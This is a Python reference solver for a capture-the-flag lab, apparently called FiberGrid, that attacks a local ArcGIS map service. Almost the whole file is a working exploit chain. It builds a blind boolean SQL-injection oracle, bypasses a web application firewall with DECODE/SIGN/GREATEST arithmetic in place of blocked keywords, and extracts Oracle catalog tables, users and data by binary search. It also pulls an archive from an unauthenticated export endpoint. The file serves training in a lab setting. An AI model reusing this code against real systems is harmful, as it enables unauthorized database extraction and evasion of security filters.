#!/usr/bin/env python3
"""FiberGrid CTF - reference solver (SPOILER).

Full chain demonstrated by this script:

  1. Recon        - public service directory + leaked internal address data
  2. Oracle       - boolean differential via returnCountOnly (1=1 vs 1=2)
  3. WAF map      - classic payloads blocked; DECODE/SIGN/GREATEST arithmetic
                    passes the appliance and executes in the database
  4. Catalog      - user, SYS_GUID, all_users, tab, col, database_properties
  5. Extraction   - numeric binary search (SIGN) and string binary search
                    (LENGTH + GREATEST equality), no ASCII()/SUBSTR()
  6. Chain        - extract the FTTH_ENVANTER export name from the staging table,
                    download the archive through the unauthenticated
                    /webservice/api/Export endpoint

Usage:
    LAB_URL=http://localhost:8080 python3 solve/solve.py
"""
import io
import os
import re
import sys
import time
import zipfile

import requests

BASE_URL = os.environ.get("LAB_URL", "http://localhost:8080").rstrip("/")
QUERY_URL = BASE_URL + "/arcgis/rest/services/KAPSAMA_VEKTOR/MapServer/0/query"
EXPORT_URL = BASE_URL + "/webservice/api/Export"
ILLER_URL = BASE_URL + "/webservice/api/AddressData/Iller"

# ASCII binary order (matches the "C" collation used by the lab database).
# Printable ASCII minus the characters the appliance rejects inside payloads:
# backslash, semicolon, hash, greater-than, less-than and tilde.
_BLOCKED = set("\\;#><~")
CHARSET = "".join(chr(code) for code in range(0x20, 0x7F)
                  if chr(code) not in _BLOCKED)

SESSION = requests.Session()
SESSION.headers["User-Agent"] = "fibergrid-solver/1.0"
REQUESTS = 0


class WafBlocked(RuntimeError):
    pass


class SqlError(RuntimeError):
    pass


def oracle(where: str) -> bool | None:
    """Boolean oracle. True = rows matched, False = none, None = SQL error."""
    global REQUESTS
    REQUESTS += 1
    response = SESSION.get(
        QUERY_URL,
        params={"where": where, "returnCountOnly": "true", "f": "json"},
        timeout=30,
    )
    if "Request Rejected" in response.text:
        raise WafBlocked(f"appliance blocked payload: {where}")
    try:
        data = response.json()
    except ValueError as exc:
        raise SqlError(f"unexpected response: {response.text[:200]}") from exc
    if "error" in data:
        return None
    return int(data["count"]) > 0


def check_true(where: str) -> bool:
    result = oracle(where)
    if result is None:
        raise SqlError(f"predicate raised a SQL error: {where}")
    return result


def sql_string(value: str) -> str:
    return value.replace("'", "''")


def gt(expr: str, source: str, number: int) -> bool:
    """True when <expr> > <number>. Comparison via SIGN arithmetic only."""
    return check_true(
        f"1=(SELECT DECODE(SIGN({expr}-{number}),1,1,-1) FROM {source})")


def ge(expr: str, source: str, value: str) -> bool:
    """True when <expr> >= '<value>'. Comparison via DECODE/GREATEST only."""
    return check_true(
        f"1=(SELECT DECODE(GREATEST({expr},'{sql_string(value)}'),{expr},1,-9) "
        f"FROM {source})")


def length_gt(expr: str, source: str, size: int) -> bool:
    return check_true(
        f"1=(SELECT DECODE(SIGN(LENGTH({expr})-{size}),1,1,-1) FROM {source})")


def equals(expr: str, source: str, value: str) -> bool:
    return check_true(
        f"1=(SELECT DECODE({expr},'{sql_string(value)}',1,-9) FROM {source})")


def brute_number(expr: str, source: str, high: int, low: int = 0) -> int:
    """Smallest v such that (expr > v) is false -> the exact value."""
    while low < high:
        middle = (low + high) // 2
        if gt(expr, source, middle):
            low = middle + 1
        else:
            high = middle
    return low


def brute_length(expr: str, source: str) -> int:
    high = 1
    while length_gt(expr, source, high):
        high *= 2
    low = 0
    while low < high:
        middle = (low + high) // 2
        if length_gt(expr, source, middle):
            low = middle + 1
        else:
            high = middle
    return low


def brute_string(expr: str, source: str, label: str, max_length: int = 96) -> str:
    """Extract a string character by character using the GREATEST oracle."""
    length = brute_length(expr, source)
    if length > max_length:
        raise RuntimeError(f"{label}: unexpected length {length}")
    value = ""
    for _ in range(length):
        low, high = 0, len(CHARSET) - 1
        found = None
        while low <= high:
            middle = (low + high) // 2
            if ge(expr, source, value + CHARSET[middle]):
                found = CHARSET[middle]
                low = middle + 1
            else:
                high = middle - 1
        if found is None:
            break
        value += found
    if not equals(expr, source, value):
        raise RuntimeError(
            f"{label}: extraction failed after {len(value)} chars "
            f"({value!r}); the value may contain a character that is not "
            f"usable inside a payload")
    return value


def step(message: str) -> None:
    print(f"\n[*] {message}", flush=True)


def main() -> int:
    start = time.time()
    flags: dict[str, str] = {}

    step("Recon: public ArcGIS service directory")
    directory = SESSION.get(f"{BASE_URL}/arcgis/rest/services?f=json",
                            timeout=15).json()
    print(f"    currentVersion={directory['currentVersion']} "
          f"services={[s['name'] for s in directory['services']]} "
          f"folders={directory['folders']}")

    step("Recon: internal address data exposure")
    iller = SESSION.get(ILLER_URL, timeout=15).json()
    notes = "\n".join(str(entry.get("not") or "") for entry in iller["iller"])
    found = re.search(r"FLAG\{[^}]+\}", notes)
    if found:
        flags["recon"] = found.group(0)
        print(f"    flag: {flags['recon']}")
    print(f"    {len(iller['iller'])} il kaydı, sorumlu/not alanları dahil")

    step("WAF: classic payloads are rejected, arithmetic passes")
    blocked = SESSION.get(QUERY_URL, params={
        "where": "1=1 AND 1=1", "returnCountOnly": "true", "f": "json"},
        timeout=15)
    print(f"    '1=1 AND 1=1'         -> "
          f"{'Request Rejected' if 'Request Rejected' in blocked.text else 'UNEXPECTED PASS'}")
    blocked = SESSION.get(QUERY_URL, params={
        "where": "1=1--", "returnCountOnly": "true", "f": "json"},
        timeout=15)
    print(f"    '1=1--'               -> "
          f"{'Request Rejected' if 'Request Rejected' in blocked.text else 'UNEXPECTED PASS'}")

    step("Boolean oracle and Oracle fingerprint")
    if not check_true("1=1") or check_true("1=2"):
        raise RuntimeError("boolean differential failed")
    if not check_true("SYS_GUID() IS NOT NULL"):
        raise RuntimeError("SYS_GUID() failed")
    if not check_true("user='CBS'"):
        raise RuntimeError("session schema is not CBS")
    print("    count(1=1) != count(1=2) OK; SYS_GUID() exists; user='CBS'")

    step("Catalog: tab / col / all_users / database_properties")
    table_min = brute_string("MIN(TNAME)", "TAB", "MIN(tname)")
    table_max = brute_string("MAX(TNAME)", "TAB", "MAX(tname)")
    print(f"    tables: {table_min}, {table_max}")

    column_one = brute_string(
        "MIN(CNAME)", "COL WHERE (TNAME,COLNO) IN (('GUZERGAH',1))",
        "GUZERGAH column #1")
    print(f"    GUZERGAH column #1: {column_one}")

    account = brute_string("MIN(USERNAME)", "ALL_USERS", "MIN(username)")
    db_name = brute_string(
        "MAX(PROPERTY_VALUE)",
        "DATABASE_PROPERTIES WHERE PROPERTY_NAME='GLOBAL_DB_NAME'",
        "GLOBAL_DB_NAME")
    print(f"    account: {account}   database: {db_name}")

    step("Blind extraction: staging table (A90312)")
    flag_staging = brute_string(
        f"MIN(ACIKLAMA)", f"{table_min}", "MIN(ACIKLAMA)")
    flags["staging"] = flag_staging
    print(f"    flag: {flag_staging}")

    step("Blind extraction: targeted route record (GUZERGAH)")
    max_objectid = brute_number("MAX(OBJECTID)", table_max, high=2_000_000)
    print(f"    MAX(OBJECTID) = {max_objectid}")
    flag_route = brute_string(
        "NOTLAR", f"{table_max} WHERE OBJECTID={max_objectid}", "route note")
    flags["route"] = flag_route
    print(f"    flag: {flag_route}")

    step("Chain: extract export name and pull the archive")
    export_name = brute_string(
        "MAX(ACIKLAMA)", f"{table_min}", "MAX(ACIKLAMA)")
    if not export_name.lower().endswith(".zip"):
        raise RuntimeError(f"unexpected export name: {export_name}")
    print(f"    export name: {export_name}")

    archive = SESSION.get(EXPORT_URL, params={"file": export_name}, timeout=30)
    if archive.status_code != 200:
        raise RuntimeError(f"export download failed: HTTP {archive.status_code}")
    with zipfile.ZipFile(io.BytesIO(archive.content)) as bundle:
        print(f"    archive contents: {bundle.namelist()}")
        content = bundle.read(bundle.namelist()[0]).decode("utf-8", "replace")
    found = re.search(r"FLAG\{[^}]+\}", content)
    if not found:
        raise RuntimeError("no flag inside the export archive")
    flags["chain"] = found.group(0)
    print(f"    flag: {flags['chain']}")

    elapsed = time.time() - start
    print("\n" + "=" * 64)
    print("FiberGrid CTF - flags")
    print("=" * 64)
    for name, value in flags.items():
        print(f"  [x] {value:<42} ({name})")
    print(f"\n  {REQUESTS} HTTP requests, {elapsed:.1f}s")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (WafBlocked, SqlError, RuntimeError) as error:
        print(f"\n[!] {error}", file=sys.stderr)
        sys.exit(1)
